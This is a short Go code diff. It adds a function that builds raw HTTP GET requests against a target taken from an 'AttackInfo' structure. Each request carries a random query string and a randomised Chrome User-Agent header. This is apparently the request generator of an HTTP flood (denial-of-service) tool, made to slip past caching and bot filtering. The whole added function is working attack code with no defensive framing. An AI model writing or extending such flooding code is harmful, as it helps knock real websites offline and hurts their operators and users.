@@ -63,3 +63,9 @@ func RandString(length int) string {
 	cryptoRand.Read(buffer)
 	return fmt.Sprintf("%x", buffer)[:length]
 }
+
+func GetBuffer(attackInfo *AttackInfo) []byte {
+	userAgentVersion := Range(117, 122)
+	querySize := Range(15, 25)
+	return []byte("GET " + attackInfo.Target.Path + "?" + RandString(querySize) + " HTTP/1.1\r\nHost: " + attackInfo.Target.Host + "\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + ToStr(userAgentVersion) + ".0.0.0 Safari/537.36\r\n\r\n")
+}
